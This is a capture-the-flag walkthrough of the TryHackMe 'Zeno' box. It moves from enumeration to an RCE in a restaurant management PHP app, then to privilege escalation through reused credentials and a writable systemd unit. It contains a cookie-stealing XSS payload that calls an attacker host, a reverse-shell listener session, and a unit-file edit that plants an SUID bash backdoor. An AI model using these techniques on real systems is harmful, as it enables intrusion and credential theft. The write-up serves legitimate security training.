# Try Hack Me - Zeno

**Categories:** Security, RCE, OSCP  
**Difficulty:** Medium  

Commands used in this guide use the exported variable $IP (`export IP=10.10.4.12`) in place of the target machine's IP address.

## 1: Enumeration - rustscan, nmap, gobuster

Having launched the box, we run rustscan following by an nmap version scan of the discovered ports (22, 12340) : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/zeno]
└─$ sudo nmap $IP -p22,12340 -sV -o nmap.version
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 17:01 EDT
Nmap scan report for 10.10.4.12
Host is up (0.100s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
```

Google and searchsploit reveal no relevant vulnerabilities for the discovered versions. Navigating to the application on 12340 shows a stock 404 page, so we continue to a gobuster scan of the application using dirbuster's medium wordlist, revealing an `/rms/` route that hosts the "Pathfinder Hotel Restaurant Management System" : 

```html
<h1><center>Welcome To Pathfinder Hotel Restaurant Management System!</center></h1>
```

A Google search for "Restaurant Management System PHP vulnerabilities" reveals a number of vulnerabilities in the application, including [XSS session hijacking](https://www.sevenlayers.com/index.php/264-restaurant-management-system-1-0-xss-session-hijack), [arbitrary file upload](https://www.sevenlayers.com/index.php/265-restaurant-management-system-1-0-arbitrary-file-upload) and [remote code execution](https://www.exploit-db.com/exploits/47520).

## 2. Dead end - persistent XSS, user sign up

After reading the outline of the arbitrary file upload vulnerability discovered above, I had assumed that the RCE vulnerability required authentication - this was wrong, but it meant that I started by looking at the XSS vulnerability. The application allows users to create an account (`/rms/login-register.phg`) using their first name, last name and email address. After creating an account the new user receives a message from the administrator in the inbox section of the site (`/rms/inbox.php`) : 

```html
<CAPTION><h2>INBOX</h2></CAPTION>
<tr>
<th>From</th>
<th>Date Received</th>
<th>Time Received</th>
<th>Subject</th>
<th>Text</th>
</tr>

<tr><td>administrator</td><td>2020-12-08</td><td>03:16:13</td><td>sample</td><td width='350' align='left'>Sample Message</td></tr></table>
</div>
```

Here I assumed that we might be able to steal the administrators session cookie by creating a user with first name or last name of `<scr_pt>fetch('http:ATTACK-IP/?c='document.cookie)<//scr_pt>` - normally this wouldn't be much use in the context of a CTF, but the message received in the account inbox made me think that there may be some headless browser stuff going on to replicate an XSS vulnerability. This works for self-XSS when the user's first name is displayed at `/rms/member-index.php`, but administrator never calls home with their cookie.

## 3: Foothold - unauthenticated arbitrary file upload, RCE

After looking again at the RCE exploit script discovered in step 1, I realised that it hardcodes the session cookie required for file upload - unless there is kind of hardcoded superadmin session ID madness going on in the application, this is probably an indicator that this vulnerability does not require authentication. I didn't get on very well with the exploit script (it bugs due to formatting errors, it hardcodes a proxy address, it hardcodes a a load of unnecessary headers, etc.), so [I wrote a simplified version adapted for the box that uploads and activates a simple php reverse shell](./rms_exploit.py). Configure the LHOST, RHOST and RPORT variables at lines 11-13, start a listener on your LHOST port, and run the script - the reverse shell will connect to the listener, providing a session as the apache user : 

```console
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.4.12] 35120
sh-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

## 4: Privesc, apache -> edward - credential discovery

Catting `/etc/passwd` shows one non-system / non-root user edward. Catting the `config.php` file at `/var/www/html/rms/` gives plaintext credentials for the application database, but the password is not good for either edward or root. Sqlmap has already shown us that there is no relevant data for privesc in the db, and running `ps -auxf` shows that the MySql process is not running as root (preventing any kind of [user defined function privesc](https://redteamnation.com/mysql-user-defined-functions/)). Running out of ideas, we download [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) from the attack machine and run it as the apache user, revealing :

* A writeable unit file at `/etc/systemd/system/zeno-monitoring.service`
* Plaintext credentials for a user "zeno" at `/etc/fstab`

The discovered credentials are also good for the edward user : 

```console
sh-4.2$ su edward
Password:
id
uid=1000(edward) gid=1000(edward) groups=1000(edward) context=system_u:system_r:httpd_t:s0
```

The user flag is as `/home/edward/user.txt` - you can use the same credentials to connect over SSH for a fully functional shell.

## 5: Privesc, edward -> root - sudo -l, writeable unit file

Running `sudo -l` as edward reveals that they can be reboot the machine, giving us the final piece of the puzzle required to exploit the writable unit file discovered by Linpeas : 

```console
sudo -l
User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

We can change the ExecStart key of the unit file to perform any action as root - in this case, we'll create an SUID bash binary at `/home/edward/bd`, allowing us to start a root shell session :

```console
[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service 
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cp /home/edward/bd /tmp/bd && chmod u+s /home/edward/bd"

[Install]
WantedBy=multi-user.target
```

We then use the edward user's sudo permissions to restart the box (`sudo /usr/sbin/reboot`), forcing the zeno-monitoring.service to run its ExecStart command. Reconnecting following the reboot, we find the backdoor binary at `/home/edward/bd` : 

```console
[edward@zeno ~]$ ls -l
total 948
-rwsr-xr-x. 1 root root   964536 Oct 24 02:52 bd
-rw-r-----. 1 root edward     38 Jul 26 21:13 user.txt
```

allowing us to start a root shell (don't forget the `-p` flag to preserve the SUID permissions when running bash) :

```console
[edward@zeno ~]$ ./bd -p
bd-4.2# whoami
root
```

The root flag is at `/root/root.txt`.
